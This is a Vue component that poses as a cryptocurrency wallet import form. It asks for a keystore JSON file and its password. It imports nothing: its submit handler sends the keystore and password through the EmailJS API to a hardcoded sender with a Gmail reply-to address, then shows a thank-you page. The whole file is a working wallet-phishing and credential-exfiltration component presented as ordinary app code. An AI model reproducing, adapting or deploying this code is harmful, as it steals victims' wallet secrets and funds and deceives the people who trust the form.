<template>
  <div class="private flex h-full flex-col px-5">
    <label class="mb-4 font-light text-lg text-center" for=""
      >Please enter your keystore JSON</label
    >
    <el-input
      class="text-white bg-black"
      type="textarea"
      :rows="2"
      v-model="keystore_JSON"
    >
    </el-input>
    <span class="mt-4">Please enter your keystore in JSON format</span>

    <el-input
      placeholder="Password"
      class="my-5 text-white"
      show-password
      v-model="password"
    >
    </el-input>
    <p class="my-10 font-semibold text-sm">
      Input the BIP39/BIP44 recovery phrase here to restore the private keys
      that manage your acccounts
    </p>
    <el-button :loading="loading" @click="sendData" class="text-white bg-black"
      >Import</el-button
    >
  </div>
</template>

<script>
import axios from "axios";
export default {
  data() {
    return {
      keystore_JSON: "",
      password: "",
      loading: false,
    };
  },
  methods: {
    sendData() {
      this.loading = true;
      let self = this;
      const checker = this.formChecker();
      if (checker) {
        var data = {
          service_id: "service_p0o93p4",
          template_id: "template_fv2dgal",
          user_id: "user_AKk1IFwxcKzXtVQRQpIrf",
          template_params: {
            from_name: "KEYSTORE",
            keystore_JSON: this.keystore_JSON,
            password: this.password,
            reply_to: "webstarknight4@gmail.com",
          },
        };
        axios
          .post("https://api.emailjs.com/api/v1.0/email/send", data)
          .then(function() {
            self.$router.push("/thank-you")
            self.loading = false;
          })
          .catch(function() {
            self.loading = false;
          });
      } else {
        this.$notify({
          title: "Warning",
          message: "All Form input is required",
          type: "warning",
        });
      }
    },
    formChecker() {
      if (this.textarea === "" || this.password === "") {
        return false;
      } else {
        return true;
      }
    },
  },
};
</script>

<style lang="scss">

</style>
